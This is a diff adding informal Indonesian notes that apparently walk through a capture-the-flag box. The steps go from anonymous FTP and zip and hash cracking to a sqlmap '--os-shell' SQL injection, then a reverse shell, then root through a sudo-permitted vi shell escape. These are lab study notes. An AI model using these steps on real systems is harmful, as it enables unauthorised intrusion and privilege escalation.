@@ -1,0 +1,22 @@
+1. scan nmap ada 21 22 80  -> 21 ada Anonymous ftp in aja
+2. ftp ip 21 -> login Anonymous -> get file nya
+3. unzip gabisa ada passwd -> zip2john namafile.zip > namafile.hash -> john namafile.hash --wordlist=/rockyou.txt
+4. nemu passwd unzip aja file nya
+5. dapet index.php isinya creds buat login coba passwd nya taruh di crackstation aja dapet tuh
+6. login aja coba search ampe ada param bisa tuh di sqlmap 
+7. o iya ampe ke rce pake ini -> --os-shell
+8. sqlmap -u "http://ip/dashboard.php?search=1" --os-shell  
+9. salah jir ternyata sqlmap ada tekniknya 
+10. sqlmap -u "url?search='" atau %27 -> --cookies="PHPSESSID=kuki" kasih itu juga soalnya kan ini butuh login masa ngasal
+11. dah dapet os-shell next revshell aja biar enakan 
+12. di var/www ada dashboard.php ada creds disitu
+13. flagg ada di tmepat kita muncul tadi dah keknya
+14. klaim user flag
+
+
+PE :
+1. sudo -l -> ada vi tapi vi nya ngarah ke file jadinya gabisa sembarangan PE nya
+2. di gtfo ambil yang shell soalnya aku coba2 yg sudo gabisa
+3. yang shell tinggal run aja vi ke file di sudo -l nya terus gini
+4. :set shell=/bin/sh -> :shell -> kayak mau keluar vim lah ya
+5. klaim root  
